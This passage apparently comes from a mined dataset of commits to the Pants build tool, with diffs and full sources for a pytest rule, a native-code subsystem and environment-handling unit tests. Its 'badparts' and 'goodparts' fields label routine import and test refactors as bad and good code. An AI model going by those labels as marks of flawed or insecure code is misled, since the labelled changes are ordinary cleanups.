DirectoryWithPrefixToStrip, Snapshot,\n                             UrlToFetch)\nfrom pants.engine.isolated_process import (ExecuteProcessRequest, ExecuteProcessResult,\n                                           FallibleExecuteProcessResult)\nfrom pants.engine.legacy.graph import BuildFileAddresses, TransitiveHydratedTargets\nfrom pants.engine.legacy.structs import PythonTestsAdaptor\nfrom pants.engine.rules import UnionRule, optionable_rule, rule\nfrom pants.engine.selectors import Get\nfrom pants.rules.core.core_test_model import Status, TestResult, TestTarget\nfrom pants.source.source_root import SourceRootConfig\n\n\ndef parse_interpreter_constraints(python_setup, python_target_adaptors):\n  constraints = {\n    constraint\n    for target_adaptor in python_target_adaptors\n    for constraint in python_setup.compatibility_or_constraints(\n      getattr(target_adaptor, 'compatibility', None)\n    )\n  }\n  constraints_args = []\n  for constraint in sorted(constraints):\n    constraints_args.extend([\"--interpreter-constraint\", text_type(constraint)])\n  return constraints_args\n\n\n# TODO: Support resources\n# TODO(7697): Use a dedicated rule for removing the source root prefix, so that this rule\n# does not have to depend on SourceRootConfig.\n@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])\ndef run_python_test(test_target, pytest, python_setup, source_root_config):\n  \"\"\"Runs pytest for one target.\"\"\"\n\n  # TODO: Inject versions and digests here through some option, rather than hard-coding it.\n  url = 'https://github.com/pantsbuild/pex/releases/download/v1.6.6/pex'\n  digest = Digest('61bb79384db0da8c844678440bd368bcbfac17bbdb865721ad3f9cb0ab29b629', 1826945)\n  pex_snapshot = yield Get(Snapshot, UrlToFetch(url, digest))\n\n  # TODO(7726): replace this with a proper API to get the `closure` for a\n  # TransitiveHydratedTarget.\n  transitive_hydrated_targets = yield Get(\n    TransitiveHydratedTargets, BuildFileAddresses((test_target.address,))\n  )\n  all_targets = [t.adaptor for t in transitive_hydrated_targets.closure]\n\n  # Produce a pex containing pytest and all transitive 3rdparty requirements.\n  all_target_requirements = []\n  for maybe_python_req_lib in all_targets:\n    # This is a python_requirement()-like target.\n    if hasattr(maybe_python_req_lib, 'requirement'):\n      all_target_requirements.append(str(maybe_python_req_lib.requirement))\n    # This is a python_requirement_library()-like target.\n    if hasattr(maybe_python_req_lib, 'requirements'):\n      for py_req in maybe_python_req_lib.requirements:\n        all_target_requirements.append(str(py_req.requirement))\n\n  # Sort all user requirement strings to increase the chance of cache hits across invocations.\n  all_requirements = sorted(all_target_requirements + list(pytest.get_requirement_strings()))\n\n  # TODO(#7061): This str() can be removed after we drop py2!\n  python_binary = text_type(sys.executable)\n  interpreter_constraint_args = parse_interpreter_constraints(\n    python_setup, python_target_adaptors=all_targets\n  )\n\n  # TODO: This is non-hermetic because the requirements will be resolved on the fly by\n  # pex27, where it should be hermetically provided in some way.\n  output_pytest_requirements_pex_filename = 'pytest-with-requirements.pex'\n  requirements_pex_argv = [\n    python_binary,\n    './{}'.format(pex_snapshot.files[0]),\n    '-e', 'pytest:main',\n    '-o', output_pytest_requirements_pex_filename,\n  ] + interpreter_constraint_args + [\n    # TODO(#7061): This text_type() wrapping can be removed after we drop py2!\n    text_type(req) for req in all_requirements\n  ]\n  requirements_pex_request = ExecuteProcessRequest(\n    argv=tuple(requirements_pex_argv),\n    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n    input_files=pex_snapshot.directory_digest,\n    description='Resolve requirements: {}'.format(\", \".join(all_requirements)),\n    output_files=(output_pytest_requirements_pex_filename,),\n  )\n  requirements_pex_response = yield Get(\n    ExecuteProcessResult, ExecuteProcessRequest, requirements_pex_request)\n\n  source_roots = source_root_config.get_source_roots()\n\n  # Gather sources and adjust for the source root.\n  # TODO: make TargetAdaptor return a 'sources' field with an empty snapshot instead of raising to\n  # simplify the hasattr() checks here!\n  # TODO(7714): restore the full source name for the stdout of the Pytest run.\n  sources_snapshots_and_source_roots = []\n  for maybe_source_target in all_targets:\n    if hasattr(maybe_source_target, 'sources'):\n      tgt_snapshot = maybe_source_target.sources.snapshot\n      tgt_source_root = source_roots.find_by_path(maybe_source_target.address.spec_path)\n      sources_snapshots_and_source_roots.append((tgt_snapshot, tgt_source_root))\n  all_sources_digests = yield [\n    Get(\n      Digest,\n      DirectoryWithPrefixToStrip(\n        directory_digest=snapshot.directory_digest,\n        prefix=source_root.path\n      )\n    )\n    for snapshot, source_root\n    in sources_snapshots_and_source_roots\n  ]\n\n  sources_digest = yield Get(\n    Digest, DirectoriesToMerge(directories=tuple(all_sources_digests)),\n  )\n\n  inits_digest = yield Get(InjectedInitDigest, Digest, sources_digest)\n\n  all_input_digests = [\n    sources_digest,\n    inits_digest.directory_digest,\n    requirements_pex_response.output_directory_digest,\n  ]\n  merged_input_files = yield Get(\n    Digest,\n    DirectoriesToMerge,\n    DirectoriesToMerge(directories=tuple(all_input_digests)),\n  )\n\n  request = ExecuteProcessRequest(\n    argv=(python_binary, './{}'.format(output_pytest_requirements_pex_filename)),\n    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n    input_files=merged_input_files,\n    description='Run pytest for {}'.format(test_target.address.reference()),\n  )\n\n  result = yield Get(FallibleExecuteProcessResult, ExecuteProcessRequest, request)\n  status = Status.SUCCESS if result.exit_code == 0 else Status.FAILURE\n\n  yield TestResult(\n    status=status,\n    stdout=result.stdout.decode('utf-8'),\n    stderr=result.stderr.decode('utf-8'),\n  )\n\n\ndef rules():\n  return [\n      run_python_test,\n      UnionRule(TestTarget, PythonTestsAdaptor),\n      optionable_rule(PyTest),\n      optionable_rule(PythonSetup),\n      optionable_rule(SourceRootConfig),\n    ]\n"}, "/src/python/pants/backend/python/subsystems/python_native_code.py": {"changes": [{"diff": "\n from pants.base.exceptions import IncompatiblePlatformsError\n from pants.binaries.executable_pex_tool import ExecutablePexTool\n+from pants.engine.rules import optionable_rule, rule\n from pants.subsystem.subsystem import Subsystem\n from pants.util.memo import memoized_property\n-from pants.util.objects import SubclassesOf\n+from pants.util.objects import SubclassesOf, TypedCollection, datatype, string_type\n+from pants.util.strutil import safe_shlex_join, safe_shlex_split\n \n \n logger = logging.getLogger(__name__)\n", "add": 3, "remove": 1, "filename": "/src/python/pants/backend/python/subsystems/python_native_code.py", "badparts": ["from pants.util.objects import SubclassesOf"], "goodparts": ["from pants.engine.rules import optionable_rule, rule", "from pants.util.objects import SubclassesOf, TypedCollection, datatype, string_type", "from pants.util.strutil import safe_shlex_join, safe_shlex_split"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import logging from textwrap import dedent from pants.backend.native.subsystems.native_toolchain import NativeToolchain from pants.backend.native.targets.native_library import NativeLibrary from pants.backend.python.python_requirement import PythonRequirement from pants.backend.python.subsystems import pex_build_util from pants.backend.python.subsystems.python_setup import PythonSetup from pants.backend.python.targets.python_distribution import PythonDistribution from pants.base.exceptions import IncompatiblePlatformsError from pants.binaries.executable_pex_tool import ExecutablePexTool from pants.subsystem.subsystem import Subsystem from pants.util.memo import memoized_property from pants.util.objects import SubclassesOf logger=logging.getLogger(__name__) class PythonNativeCode(Subsystem): \"\"\"A subsystem which exposes components of the native backend to the python backend.\"\"\" options_scope='python-native-code' default_native_source_extensions=['.c', '.cpp', '.cc'] class PythonNativeCodeError(Exception): pass @classmethod def register_options(cls, register): super(PythonNativeCode, cls).register_options(register) register('--native-source-extensions', type=list, default=cls.default_native_source_extensions, fingerprint=True, advanced=True, help='The extensions recognized for native source files in `python_dist()` sources.') @classmethod def subsystem_dependencies(cls): return super(PythonNativeCode, cls).subsystem_dependencies() +( NativeToolchain.scoped(cls), PythonSetup, ) @memoized_property def _native_source_extensions(self): return self.get_options().native_source_extensions @memoized_property def native_toolchain(self): return NativeToolchain.scoped_instance(self) @memoized_property def _python_setup(self): return PythonSetup.global_instance() def pydist_has_native_sources(self, target): return target.has_sources(extension=tuple(self._native_source_extensions)) @memoized_property def _native_target_matchers(self): return{ SubclassesOf(PythonDistribution): self.pydist_has_native_sources, SubclassesOf(NativeLibrary): NativeLibrary.produces_ctypes_native_library, } def _any_targets_have_native_sources(self, targets): for tgt in targets: for type_constraint, target_predicate in self._native_target_matchers.items(): if type_constraint.satisfied_by(tgt) and target_predicate(tgt): return True return False def check_build_for_current_platform_only(self, targets): \"\"\" Performs a check of whether the current target closure has native sources and if so, ensures that Pants is only targeting the current platform. :param tgts: a list of:class:`Target` objects. :return: a boolean value indicating whether the current target closure has native sources. :raises::class:`pants.base.exceptions.IncompatiblePlatformsError` \"\"\" if not self._any_targets_have_native_sources(targets): return False platforms_with_sources=pex_build_util.targets_by_platform(targets, self._python_setup) platform_names=list(platforms_with_sources.keys()) if not platform_names or platform_names==['current']: return True bad_targets=set() for platform, targets in platforms_with_sources.items(): if platform=='current': continue bad_targets.update(targets) raise IncompatiblePlatformsError(dedent(\"\"\"\\ Pants doesn't currently support cross-compiling native code. The following targets set platforms arguments other than['current'], which is unsupported for this reason. Please either remove the platforms argument from these targets, or set them to exactly['current']. Bad targets: {} \"\"\".format('\\n'.join(sorted(target.address.reference() for target in bad_targets))) )) class BuildSetupRequiresPex(ExecutablePexTool): options_scope='build-setup-requires-pex' @classmethod def register_options(cls, register): super(BuildSetupRequiresPex, cls).register_options(register) register('--setuptools-version', advanced=True, fingerprint=True, default='40.6.3', help='The setuptools version to use when executing `setup.py` scripts.') register('--wheel-version', advanced=True, fingerprint=True, default='0.32.3', help='The wheel version to use when executing `setup.py` scripts.') @property def base_requirements(self): return[ PythonRequirement('setuptools=={}'.format(self.get_options().setuptools_version)), PythonRequirement('wheel=={}'.format(self.get_options().wheel_version)), ] ", "sourceWithComments": "# coding=utf-8\n# Copyright 2017 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport logging\nfrom textwrap import dedent\n\nfrom pants.backend.native.subsystems.native_toolchain import NativeToolchain\nfrom pants.backend.native.targets.native_library import NativeLibrary\nfrom pants.backend.python.python_requirement import PythonRequirement\nfrom pants.backend.python.subsystems import pex_build_util\nfrom pants.backend.python.subsystems.python_setup import PythonSetup\nfrom pants.backend.python.targets.python_distribution import PythonDistribution\nfrom pants.base.exceptions import IncompatiblePlatformsError\nfrom pants.binaries.executable_pex_tool import ExecutablePexTool\nfrom pants.subsystem.subsystem import Subsystem\nfrom pants.util.memo import memoized_property\nfrom pants.util.objects import SubclassesOf\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass PythonNativeCode(Subsystem):\n  \"\"\"A subsystem which exposes components of the native backend to the python backend.\"\"\"\n\n  options_scope = 'python-native-code'\n\n  default_native_source_extensions = ['.c', '.cpp', '.cc']\n\n  class PythonNativeCodeError(Exception): pass\n\n  @classmethod\n  def register_options(cls, register):\n    super(PythonNativeCode, cls).register_options(register)\n\n    register('--native-source-extensions', type=list, default=cls.default_native_source_extensions,\n             fingerprint=True, advanced=True,\n             help='The extensions recognized for native source files in `python_dist()` sources.')\n\n  @classmethod\n  def subsystem_dependencies(cls):\n    return super(PythonNativeCode, cls).subsystem_dependencies() + (\n      NativeToolchain.scoped(cls),\n      PythonSetup,\n    )\n\n  @memoized_property\n  def _native_source_extensions(self):\n    return self.get_options().native_source_extensions\n\n  @memoized_property\n  def native_toolchain(self):\n    return NativeToolchain.scoped_instance(self)\n\n  @memoized_property\n  def _python_setup(self):\n    return PythonSetup.global_instance()\n\n  def pydist_has_native_sources(self, target):\n    return target.has_sources(extension=tuple(self._native_source_extensions))\n\n  @memoized_property\n  def _native_target_matchers(self):\n    return {\n      SubclassesOf(PythonDistribution): self.pydist_has_native_sources,\n      SubclassesOf(NativeLibrary): NativeLibrary.produces_ctypes_native_library,\n    }\n\n  def _any_targets_have_native_sources(self, targets):\n    # TODO(#5949): convert this to checking if the closure of python requirements has any\n    # platform-specific packages (maybe find the platforms there too?).\n    for tgt in targets:\n      for type_constraint, target_predicate in self._native_target_matchers.items():\n        if type_constraint.satisfied_by(tgt) and target_predicate(tgt):\n          return True\n    return False\n\n  def check_build_for_current_platform_only(self, targets):\n    \"\"\"\n    Performs a check of whether the current target closure has native sources and if so, ensures\n    that Pants is only targeting the current platform.\n\n    :param tgts: a list of :class:`Target` objects.\n    :return: a boolean value indicating whether the current target closure has native sources.\n    :raises: :class:`pants.base.exceptions.IncompatiblePlatformsError`\n    \"\"\"\n    # TODO(#5949): convert this to checking if the closure of python requirements has any\n    # platform-specific packages (maybe find the platforms there too?).\n    if not self._any_targets_have_native_sources(targets):\n      return False\n\n    platforms_with_sources = pex_build_util.targets_by_platform(targets, self._python_setup)\n    platform_names = list(platforms_with_sources.keys())\n\n    if not platform_names or platform_names == ['current']:\n      return True\n\n    bad_targets = set()\n    for platform, targets in platforms_with_sources.items():\n      if platform == 'current':\n        continue\n      bad_targets.update(targets)\n\n    raise IncompatiblePlatformsError(dedent(\"\"\"\\\n      Pants doesn't currently support cross-compiling native code.\n      The following targets set platforms arguments other than ['current'], which is unsupported for this reason.\n      Please either remove the platforms argument from these targets, or set them to exactly ['current'].\n      Bad targets:\n      {}\n      \"\"\".format('\\n'.join(sorted(target.address.reference() for target in bad_targets)))\n    ))\n\n\nclass BuildSetupRequiresPex(ExecutablePexTool):\n  options_scope = 'build-setup-requires-pex'\n\n  @classmethod\n  def register_options(cls, register):\n    super(BuildSetupRequiresPex, cls).register_options(register)\n    register('--setuptools-version', advanced=True, fingerprint=True, default='40.6.3',\n             help='The setuptools version to use when executing `setup.py` scripts.')\n    register('--wheel-version', advanced=True, fingerprint=True, default='0.32.3',\n             help='The wheel version to use when executing `setup.py` scripts.')\n\n  @property\n  def base_requirements(self):\n    return [\n      PythonRequirement('setuptools=={}'.format(self.get_options().setuptools_version)),\n      PythonRequirement('wheel=={}'.format(self.get_options().wheel_version)),\n    ]\n"}, "/tests/python/pants_test/util/test_contextutil.py": {"changes": [{"diff": "\n           self.assertEqual('False\\n', output.read())\n \n   def test_hermetic_environment(self):\n-    self.assertIn('USER', os.environ)\n-    with hermetic_environment_as(**{}):\n-      self.assertNotIn('USER', os.environ)\n+    with self.ensure_user_defined_in_environment():\n+      with hermetic_environment_as():\n+        self.assertNotIn('USER', os.environ)\n \n   def test_hermetic_environment_subprocesses(self):\n-    self.assertIn('USER', os.environ)\n-    with hermetic_environment_as(**dict(AAA='333')):\n-      output = subprocess.check_output('env', shell=True).decode('utf-8')\n-      self.assertNotIn('USER=', output)\n-      self.assertIn('AAA', os.environ)\n-      self.assertEqual(os.environ['AAA'], '333')\n-    self.assertIn('USER', os.environ)\n-    self.assertNotIn('AAA', os.environ)\n+    with self.ensure_user_defined_in_environment():\n+      with hermetic_environment_as(AAA='333'):\n+        output = subprocess.check_output('env', shell=True).decode('utf-8')\n+        self.assertNotIn('USER=', output)\n+        self.assertIn('AAA', os.environ)\n+        self.assertEqual(os.environ['AAA'], '333')\n+      self.assertIn('USER', os.environ)\n+      self.assertNotIn('AAA', os.environ)\n \n   def test_hermetic_environment_unicode(self):\n     UNICODE_CHAR = '\u00a1'\n     ENCODED_CHAR = UNICODE_CHAR.encode('utf-8')\n     expected_output = UNICODE_CHAR if PY3 else ENCODED_CHAR\n-    with environment_as(**dict(XXX=UNICODE_CHAR)):\n+    with environment_as(XXX=UNICODE_CHAR):\n       self.assertEqual(os.environ['XXX'], expected_output)\n-      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):\n+      with hermetic_environment_as(AAA=UNICODE_CHAR):\n         self.assertIn('AAA', os.environ)\n         self.assertEqual(os.environ['AAA'], expected_output)\n       self.assertEqual(os.environ['XXX'], expected_output)\n", "add": 13, "remove": 13, "filename": "/tests/python/pants_test/util/test_contextutil.py", "badparts": ["    self.assertIn('USER', os.environ)", "    with hermetic_environment_as(**{}):", "      self.assertNotIn('USER', os.environ)", "    self.assertIn('USER', os.environ)", "    with hermetic_environment_as(**dict(AAA='333')):", "      output = subprocess.check_output('env', shell=True).decode('utf-8')", "      self.assertNotIn('USER=', output)", "      self.assertIn('AAA', os.environ)", "      self.assertEqual(os.environ['AAA'], '333')", "    self.assertIn('USER', os.environ)", "    self.assertNotIn('AAA', os.environ)", "    with environment_as(**dict(XXX=UNICODE_CHAR)):", "      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):"], "goodparts": ["    with self.ensure_user_defined_in_environment():", "      with hermetic_environment_as():", "        self.assertNotIn('USER', os.environ)", "    with self.ensure_user_defined_in_environment():", "      with hermetic_environment_as(AAA='333'):", "        output = subprocess.check_output('env', shell=True).decode('utf-8')", "        self.assertNotIn('USER=', output)", "        self.assertIn('AAA', os.environ)", "        self.assertEqual(os.environ['AAA'], '333')", "      self.assertIn('USER', os.environ)", "      self.assertNotIn('AAA', os.environ)", "    with environment_as(XXX=UNICODE_CHAR):", "      with hermetic_environment_as(AAA=UNICODE_CHAR):"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import os import pstats import shutil import signal import sys import unittest import uuid import zipfile from builtins import next, object, range, str from contextlib import contextmanager import mock from future.utils import PY3 from pants.util.contextutil import(InvalidZipPath, Timer, environment_as, exception_logging, hermetic_environment_as, maybe_profiled, open_zip, pushd, signal_handler_as, stdio_as, temporary_dir, temporary_file) from pants.util.process_handler import subprocess PATCH_OPTS=dict(autospec=True, spec_set=True) class ContextutilTest(unittest.TestCase): def test_empty_environment(self): with environment_as(): pass def test_override_single_variable(self): with temporary_file(binary_mode=False) as output: with environment_as(HORK='BORK'): subprocess.Popen([sys.executable, '-c', 'import os; print(os.environ[\"HORK\"])'], stdout=output).wait() output.seek(0) self.assertEqual('BORK\\n', output.read()) with temporary_file(binary_mode=False) as new_output: subprocess.Popen([sys.executable, '-c', 'import os; print(\"HORK\" in os.environ)'], stdout=new_output).wait() new_output.seek(0) self.assertEqual('False\\n', new_output.read()) def test_environment_negation(self): with temporary_file(binary_mode=False) as output: with environment_as(HORK='BORK'): with environment_as(HORK=None): subprocess.Popen([sys.executable, '-c', 'import os; print(\"HORK\" in os.environ)'], stdout=output).wait() output.seek(0) self.assertEqual('False\\n', output.read()) def test_hermetic_environment(self): self.assertIn('USER', os.environ) with hermetic_environment_as(**{}): self.assertNotIn('USER', os.environ) def test_hermetic_environment_subprocesses(self): self.assertIn('USER', os.environ) with hermetic_environment_as(**dict(AAA='333')): output=subprocess.check_output('env', shell=True).decode('utf-8') self.assertNotIn('USER=', output) self.assertIn('AAA', os.environ) self.assertEqual(os.environ['AAA'], '333') self.assertIn('USER', os.environ) self.assertNotIn('AAA', os.environ) def test_hermetic_environment_unicode(self): UNICODE_CHAR='\u00a1' ENCODED_CHAR=UNICODE_CHAR.encode('utf-8') expected_output=UNICODE_CHAR if PY3 else ENCODED_CHAR with environment_as(**dict(XXX=UNICODE_CHAR)): self.assertEqual(os.environ['XXX'], expected_output) with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)): self.assertIn('AAA', os.environ) self.assertEqual(os.environ['AAA'], expected_output) self.assertEqual(os.environ['XXX'], expected_output) def test_simple_pushd(self): pre_cwd=os.getcwd() with temporary_dir() as tempdir: with pushd(tempdir) as path: self.assertEqual(tempdir, path) self.assertEqual(os.path.realpath(tempdir), os.getcwd()) self.assertEqual(pre_cwd, os.getcwd()) self.assertEqual(pre_cwd, os.getcwd()) def test_nested_pushd(self): pre_cwd=os.getcwd() with temporary_dir() as tempdir1: with pushd(tempdir1): self.assertEqual(os.path.realpath(tempdir1), os.getcwd()) with temporary_dir(root_dir=tempdir1) as tempdir2: with pushd(tempdir2): self.assertEqual(os.path.realpath(tempdir2), os.getcwd()) self.assertEqual(os.path.realpath(tempdir1), os.getcwd()) self.assertEqual(os.path.realpath(tempdir1), os.getcwd()) self.assertEqual(pre_cwd, os.getcwd()) self.assertEqual(pre_cwd, os.getcwd()) def test_temporary_file_no_args(self): with temporary_file() as fp: self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.') self.assertTrue(os.path.exists(fp.name)==False, 'Temporary file should not exist outside of the context.') def test_temporary_file_without_cleanup(self): with temporary_file(cleanup=False) as fp: self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.') self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist outside of context if cleanup=False.') os.unlink(fp.name) def test_temporary_file_within_other_dir(self): with temporary_dir() as path: with temporary_file(root_dir=path) as f: self.assertTrue(os.path.realpath(f.name).startswith(os.path.realpath(path)), 'file should be created in root_dir if specified.') def test_temporary_dir_no_args(self): with temporary_dir() as path: self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.') self.assertTrue(os.path.isdir(path), 'Temporary dir should be a dir and not a file.') self.assertFalse(os.path.exists(path), 'Temporary dir should not exist outside of the context.') def test_temporary_dir_without_cleanup(self): with temporary_dir(cleanup=False) as path: self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.') self.assertTrue(os.path.exists(path), 'Temporary dir should exist outside of context if cleanup=False.') shutil.rmtree(path) def test_temporary_dir_with_root_dir(self): with temporary_dir() as path1: with temporary_dir(root_dir=path1) as path2: self.assertTrue(os.path.realpath(path2).startswith(os.path.realpath(path1)), 'Nested temporary dir should be created within outer dir.') def test_timer(self): class FakeClock(object): def __init__(self): self._time=0.0 def time(self): ret=self._time self._time +=0.0001 return ret def sleep(self, duration): self._time +=duration clock=FakeClock() with Timer(clock=clock) as t: self.assertLess(t.start, clock.time()) self.assertGreater(t.elapsed, 0) clock.sleep(0.1) self.assertGreater(t.elapsed, 0.1) clock.sleep(0.1) self.assertTrue(t.finish is None) self.assertGreater(t.elapsed, 0.2) self.assertLess(t.finish, clock.time()) def test_open_zipDefault(self): with temporary_dir() as tempdir: with open_zip(os.path.join(tempdir, 'test'), 'w') as zf: self.assertTrue(zf._allowZip64) def test_open_zipTrue(self): with temporary_dir() as tempdir: with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=True) as zf: self.assertTrue(zf._allowZip64) def test_open_zipFalse(self): with temporary_dir() as tempdir: with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=False) as zf: self.assertFalse(zf._allowZip64) def test_open_zip_raises_exception_on_falsey_paths(self): falsey=(None, '', False) for invalid in falsey: with self.assertRaises(InvalidZipPath): next(open_zip(invalid).gen) def test_open_zip_returns_realpath_on_badzipfile(self): with temporary_file() as not_zip: with temporary_dir() as tempdir: file_symlink=os.path.join(tempdir, 'foo') os.symlink(not_zip.name, file_symlink) self.assertEqual(os.path.realpath(file_symlink), os.path.realpath(not_zip.name)) with self.assertRaisesRegexp(zipfile.BadZipfile, r'{}'.format(not_zip.name)): next(open_zip(file_symlink).gen) @contextmanager def _stdio_as_tempfiles(self): \"\"\"Harness to replace `sys.std*` with tempfiles. Validates that all files are read/written/flushed correctly, and acts as a contextmanager to allow for recursive tests. \"\"\" uuid_str=str(uuid.uuid4()) def u(string): return '{} stdin_data=u('stdio') stdout_data=u('stdout') stderr_data=u('stderr') with temporary_file(binary_mode=False) as tmp_stdin,\\ temporary_file(binary_mode=False) as tmp_stdout,\\ temporary_file(binary_mode=False) as tmp_stderr: print(stdin_data, file=tmp_stdin) tmp_stdin.seek(0) with stdio_as(stdout_fd=tmp_stdout.fileno(), stderr_fd=tmp_stderr.fileno(), stdin_fd=tmp_stdin.fileno()): self.assertEqual(sys.stdin.fileno(), 0) self.assertEqual(sys.stdout.fileno(), 1) self.assertEqual(sys.stderr.fileno(), 2) self.assertEqual(stdin_data, sys.stdin.read().strip()) print(stdout_data, file=sys.stdout) yield print(stderr_data, file=sys.stderr) tmp_stdout.seek(0) tmp_stderr.seek(0) self.assertEqual(stdout_data, tmp_stdout.read().strip()) self.assertEqual(stderr_data, tmp_stderr.read().strip()) def test_stdio_as(self): self.assertTrue(sys.stderr.fileno() > 2, \"Expected a pseudofile as stderr, got:{}\".format(sys.stderr)) old_stdout, old_stderr, old_stdin=sys.stdout, sys.stderr, sys.stdin with self._stdio_as_tempfiles(): with self._stdio_as_tempfiles(): pass self.assertEqual(sys.stdin.fileno(), 0) self.assertEqual(sys.stdout.fileno(), 1) self.assertEqual(sys.stderr.fileno(), 2) self.assertEqual(sys.stdout, old_stdout) self.assertEqual(sys.stderr, old_stderr) self.assertEqual(sys.stdin, old_stdin) def test_stdio_as_dev_null(self): with self._stdio_as_tempfiles(): with stdio_as(stdout_fd=-1, stderr_fd=-1, stdin_fd=-1): self.assertEqual('', sys.stdin.read()) print('garbage', file=sys.stdout) print('garbage', file=sys.stderr) def test_signal_handler_as(self): mock_initial_handler=1 mock_new_handler=2 with mock.patch('signal.signal', **PATCH_OPTS) as mock_signal: mock_signal.return_value=mock_initial_handler try: with signal_handler_as(signal.SIGUSR2, mock_new_handler): raise NotImplementedError('blah') except NotImplementedError: pass self.assertEqual(mock_signal.call_count, 2) mock_signal.assert_has_calls([ mock.call(signal.SIGUSR2, mock_new_handler), mock.call(signal.SIGUSR2, mock_initial_handler) ]) def test_permissions(self): with temporary_file(permissions=0o700) as f: self.assertEqual(0o700, os.stat(f.name)[0] & 0o777) with temporary_dir(permissions=0o644) as path: self.assertEqual(0o644, os.stat(path)[0] & 0o777) def test_exception_logging(self): fake_logger=mock.Mock() with self.assertRaises(AssertionError): with exception_logging(fake_logger, 'error!'): assert True is False fake_logger.exception.assert_called_once_with('error!') def test_maybe_profiled(self): with temporary_dir() as td: profile_path=os.path.join(td, 'profile.prof') with maybe_profiled(profile_path): for _ in range(5): print('test') self.assertTrue(os.path.exists(profile_path)) pstats.Stats(profile_path).print_stats() ", "sourceWithComments": "# coding=utf-8\n# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport os\nimport pstats\nimport shutil\nimport signal\nimport sys\nimport unittest\nimport uuid\nimport zipfile\nfrom builtins import next, object, range, str\nfrom contextlib import contextmanager\n\nimport mock\nfrom future.utils import PY3\n\nfrom pants.util.contextutil import (InvalidZipPath, Timer, environment_as, exception_logging,\n                                    hermetic_environment_as, maybe_profiled, open_zip, pushd,\n                                    signal_handler_as, stdio_as, temporary_dir, temporary_file)\nfrom pants.util.process_handler import subprocess\n\n\nPATCH_OPTS = dict(autospec=True, spec_set=True)\n\n\nclass ContextutilTest(unittest.TestCase):\n\n  def test_empty_environment(self):\n    with environment_as():\n      pass\n\n  def test_override_single_variable(self):\n    with temporary_file(binary_mode=False) as output:\n      # test that the override takes place\n      with environment_as(HORK='BORK'):\n        subprocess.Popen([sys.executable, '-c', 'import os; print(os.environ[\"HORK\"])'],\n                         stdout=output).wait()\n        output.seek(0)\n        self.assertEqual('BORK\\n', output.read())\n\n      # test that the variable is cleared\n      with temporary_file(binary_mode=False) as new_output:\n        subprocess.Popen([sys.executable, '-c', 'import os; print(\"HORK\" in os.environ)'],\n                         stdout=new_output).wait()\n        new_output.seek(0)\n        self.assertEqual('False\\n', new_output.read())\n\n  def test_environment_negation(self):\n    with temporary_file(binary_mode=False) as output:\n      with environment_as(HORK='BORK'):\n        with environment_as(HORK=None):\n          # test that the variable is cleared\n          subprocess.Popen([sys.executable, '-c', 'import os; print(\"HORK\" in os.environ)'],\n                           stdout=output).wait()\n          output.seek(0)\n          self.assertEqual('False\\n', output.read())\n\n  def test_hermetic_environment(self):\n    self.assertIn('USER', os.environ)\n    with hermetic_environment_as(**{}):\n      self.assertNotIn('USER', os.environ)\n\n  def test_hermetic_environment_subprocesses(self):\n    self.assertIn('USER', os.environ)\n    with hermetic_environment_as(**dict(AAA='333')):\n      output = subprocess.check_output('env', shell=True).decode('utf-8')\n      self.assertNotIn('USER=', output)\n      self.assertIn('AAA', os.environ)\n      self.assertEqual(os.environ['AAA'], '333')\n    self.assertIn('USER', os.environ)\n    self.assertNotIn('AAA', os.environ)\n\n  def test_hermetic_environment_unicode(self):\n    UNICODE_CHAR = '\u00a1'\n    ENCODED_CHAR = UNICODE_CHAR.encode('utf-8')\n    expected_output = UNICODE_CHAR if PY3 else ENCODED_CHAR\n    with environment_as(**dict(XXX=UNICODE_CHAR)):\n      self.assertEqual(os.environ['XXX'], expected_output)\n      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):\n        self.assertIn('AAA', os.environ)\n        self.assertEqual(os.environ['AAA'], expected_output)\n      self.assertEqual(os.environ['XXX'], expected_output)\n\n  def test_simple_pushd(self):\n    pre_cwd = os.getcwd()\n    with temporary_dir() as tempdir:\n      with pushd(tempdir) as path:\n        self.assertEqual(tempdir, path)\n        self.assertEqual(os.path.realpath(tempdir), os.getcwd())\n      self.assertEqual(pre_cwd, os.getcwd())\n    self.assertEqual(pre_cwd, os.getcwd())\n\n  def test_nested_pushd(self):\n    pre_cwd = os.getcwd()\n    with temporary_dir() as tempdir1:\n      with pushd(tempdir1):\n        self.assertEqual(os.path.realpath(tempdir1), os.getcwd())\n        with temporary_dir(root_dir=tempdir1) as tempdir2:\n          with pushd(tempdir2):\n            self.assertEqual(os.path.realpath(tempdir2), os.getcwd())\n          self.assertEqual(os.path.realpath(tempdir1), os.getcwd())\n        self.assertEqual(os.path.realpath(tempdir1), os.getcwd())\n      self.assertEqual(pre_cwd, os.getcwd())\n    self.assertEqual(pre_cwd, os.getcwd())\n\n  def test_temporary_file_no_args(self):\n    with temporary_file() as fp:\n      self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.')\n    self.assertTrue(os.path.exists(fp.name) == False,\n                    'Temporary file should not exist outside of the context.')\n\n  def test_temporary_file_without_cleanup(self):\n    with temporary_file(cleanup=False) as fp:\n      self.assertTrue(os.path.exists(fp.name), 'Temporary file should exist within the context.')\n    self.assertTrue(os.path.exists(fp.name),\n                    'Temporary file should exist outside of context if cleanup=False.')\n    os.unlink(fp.name)\n\n  def test_temporary_file_within_other_dir(self):\n    with temporary_dir() as path:\n      